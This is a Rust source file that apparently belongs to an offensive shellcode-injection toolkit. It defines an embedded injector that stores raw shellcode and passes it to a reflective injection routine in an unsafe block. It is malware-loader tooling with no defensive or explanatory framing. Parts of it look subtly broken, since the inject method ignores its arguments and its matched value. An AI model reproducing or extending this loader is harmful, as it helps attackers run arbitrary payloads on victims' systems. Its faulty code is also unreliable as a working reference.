use crate::injectors::{
    Injector,
    InjectorType,
    InjectionType,
    InjectorError,
    reflective_inject
};

pub struct EmbeddedInjector {
    shellcode: Option<Vec<u8>>
}

impl EmbeddedInjector {
    pub fn new() -> EmbeddedInjector {
        EmbeddedInjector { shellcode: None }
    }

}

impl Injector for EmbeddedInjector {
    fn load(&self, sc_source: InjectorType) -> Result<EmbeddedInjector, InjectorError> {
        use InjectorType::Embedded;
        match sc_source {
            Embedded(sc) => {
                Ok(EmbeddedInjector { shellcode: Some(sc) })
            }
            _ => Err(InjectorError("Incorrect Shellcode Type!".to_string()))
        }
    }

    fn inject(&self, injection_type: InjectionType, wait: bool) {

        match self.shellcode {
            Some(sc) => unsafe { reflective_inject(&self.shellcode, true) },
            None => panic!("No shellcode loaded!")
        }
        
    }
}